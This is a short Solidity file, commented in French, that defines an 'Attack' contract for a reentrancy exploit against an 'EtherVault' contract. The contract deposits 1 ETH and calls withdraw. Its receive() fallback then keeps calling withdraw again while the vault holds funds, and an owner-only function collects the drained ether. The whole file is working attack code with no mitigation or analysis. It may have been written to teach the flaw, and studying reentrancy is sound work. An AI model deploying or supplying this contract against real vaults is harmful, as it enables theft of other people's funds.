// Interface pour interagir avec le coffre-fort
interface IEtherVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    IEtherVault public vault;
    address public owner;

    constructor(address _vaultAddress) {
        vault = IEtherVault(_vaultAddress);
        owner = msg.sender;
    }

    
    receive() external payable {
        
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    // attaque
    function attack() external payable {
        require(msg.value >= 1 ether, "Besoin d'au moins 1 ETH pour attaquer");
        
        // 1. On dépose 1 ETH pour être enregistré dans le mapping balances
        vault.deposit{value: 1 ether}();
        
        // 2. On lance le premier retrait
        vault.withdraw();
    }

    // Pour récupérer tout
    function withdrawFunds() external {
        require(msg.sender == owner, "Pas le droit");
        payable(owner).transfer(address(this).balance);
    }
}